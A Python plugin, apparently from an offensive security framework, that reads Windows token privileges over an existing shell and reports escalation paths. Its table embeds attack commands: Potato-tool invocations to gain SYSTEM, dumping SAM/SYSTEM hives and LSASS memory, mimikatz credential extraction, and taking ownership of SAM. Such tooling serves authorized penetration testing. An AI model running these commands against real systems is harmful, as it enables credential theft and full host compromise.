"""Windows token exploit — SeImpersonate, potato attacks, token manipulation."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Dangerous privileges and their exploitation methods
TOKEN_EXPLOITS: dict[str, dict] = {
    "SeImpersonatePrivilege": {
        "severity": "critical",
        "description": "Impersonate any token — instant SYSTEM via Potato",
        "exploits": [
            "JuicyPotato (Win Server 2016/2019)",
            "PrintSpoofer (Win 10/Server 2016-2019)",
            "GodPotato (universal, all versions)",
            "SweetPotato (combined techniques)",
            "RoguePotato (network-based)",
        ],
        "commands": [
            "PrintSpoofer.exe -i -c cmd",
            "GodPotato.exe -cmd cmd.exe",
            "JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -t *",
        ],
    },
    "SeAssignPrimaryTokenPrivilege": {
        "severity": "critical",
        "description": "Assign primary token to process — create SYSTEM process",
        "exploits": [
            "JuicyPotato (combined with SeImpersonate)",
            "Token duplication via CreateProcessWithTokenW",
        ],
        "commands": [],
    },
    "SeTcbPrivilege": {
        "severity": "critical",
        "description": "Act as part of the operating system — full SYSTEM",
        "exploits": [
            "Create arbitrary tokens",
            "Modify existing tokens to add any privilege",
        ],
        "commands": [],
    },
    "SeBackupPrivilege": {
        "severity": "critical",
        "description": "Read any file — dump SAM/SYSTEM/NTDS.dit",
        "exploits": [
            "Copy SAM and SYSTEM hives",
            "Copy NTDS.dit from domain controller",
            "Read any file on the filesystem",
        ],
        "commands": [
            'reg save HKLM\\SAM C:\\Temp\\SAM',
            'reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM',
            "secretsdump.py -sam SAM -system SYSTEM LOCAL",
        ],
    },
    "SeRestorePrivilege": {
        "severity": "critical",
        "description": "Write any file — DLL hijack SYSTEM services",
        "exploits": [
            "Overwrite service DLL",
            "Modify registry hives",
            "Write to protected directories",
        ],
        "commands": [],
    },
    "SeLoadDriverPrivilege": {
        "severity": "critical",
        "description": "Load kernel driver — ring-0 code execution",
        "exploits": [
            "Load Capcom.sys (arbitrary code exec in kernel)",
            "Load custom vulnerable driver",
        ],
        "commands": [],
    },
    "SeTakeOwnershipPrivilege": {
        "severity": "high",
        "description": "Take ownership of any object",
        "exploits": [
            "Take ownership of SAM/SYSTEM hive files",
            "Take ownership of service executables",
        ],
        "commands": [
            'takeown /f "C:\\Windows\\System32\\config\\SAM"',
        ],
    },
    "SeDebugPrivilege": {
        "severity": "critical",
        "description": "Debug any process — dump LSASS for credentials",
        "exploits": [
            "Dump LSASS process memory (mimikatz)",
            "Inject into SYSTEM process",
            "Modify memory of any process",
        ],
        "commands": [
            "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
            "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        ],
    },
    "SeCreateTokenPrivilege": {
        "severity": "critical",
        "description": "Create arbitrary tokens — impersonate any user",
        "exploits": [
            "Create token with any user/group SIDs",
        ],
        "commands": [],
    },
    "SeManageVolumePrivilege": {
        "severity": "high",
        "description": "Manage volumes — read raw disk, including NTFS streams",
        "exploits": [
            "Read raw disk sectors",
            "Access alternate data streams",
        ],
        "commands": [],
    },
}


class WinTokenExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="win_token_exploit",
        display_name="Windows Token Exploitation",
        category=PluginCategory.PRIVESC,
        description="SeImpersonate, potato attacks, token manipulation",
        depends_on=["windows_enum"],
        produces=["privesc_vectors"],
        timeout=30.0,
        requires_http=False,
        requires_shell=True,
        platform="windows",
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"privileges": [], "exploitable": [], "all_privs": ""}

        # Try to get privilege data from windows_enum
        enum_result = ctx.pipeline.get(f"windows_enum:{target.host}")
        priv_output = ""

        if enum_result and enum_result.ok:
            priv_lines = enum_result.data.get("privileges", [])
            priv_output = "\n".join(priv_lines) if priv_lines else ""

        if not priv_output:
            shells = ctx.state.get("active_shells", [])
            if not shells or not ctx.shell:
                return PluginResult.fail(
                    self.meta.name, target.host, error="No shell session",
                )
            session = (
                ctx.shell.get_session(shells[0]["id"])
                if isinstance(shells[0], dict) else None
            )
            if session:
                priv_output = await ctx.shell.execute(
                    session, "whoami /priv", timeout=10.0,
                ) or ""

        data["all_privs"] = priv_output[:2000]

        if not priv_output:
            findings.append(Finding.info(
                "Could not retrieve privilege information",
                tags=["privesc", "windows"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Analyze each privilege
        for priv_name, priv_info in TOKEN_EXPLOITS.items():
            if priv_name not in priv_output:
                continue

            # Check if enabled
            is_enabled = False
            for line in priv_output.splitlines():
                if priv_name in line and "Enabled" in line:
                    is_enabled = True
                    break

            status = "Enabled" if is_enabled else "Disabled (may be enableable)"
            data["privileges"].append({
                "name": priv_name, "enabled": is_enabled,
            })

            exploit_entry = {
                "privilege": priv_name,
                "enabled": is_enabled,
                "description": priv_info["description"],
                "exploits": priv_info["exploits"],
                "commands": priv_info["commands"],
            }
            data["exploitable"].append(exploit_entry)

            evidence = (
                f"Privilege: {priv_name} ({status})\n"
                f"Exploits: {', '.join(priv_info['exploits'][:3])}"
            )
            if priv_info["commands"]:
                evidence += "\nCommands:\n" + "\n".join(
                    f"  {c}" for c in priv_info["commands"][:3]
                )

            if priv_info["severity"] == "critical":
                findings.append(Finding.critical(
                    f"Dangerous privilege: {priv_name} ({status})",
                    evidence=evidence,
                    description=priv_info["description"],
                    tags=["privesc", "token", "windows"],
                ))
            else:
                findings.append(Finding.high(
                    f"Exploitable privilege: {priv_name} ({status})",
                    evidence=evidence,
                    description=priv_info["description"],
                    tags=["privesc", "token", "windows"],
                ))

        if not data["exploitable"]:
            findings.append(Finding.info(
                "No dangerous token privileges found",
                tags=["privesc", "token", "windows"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
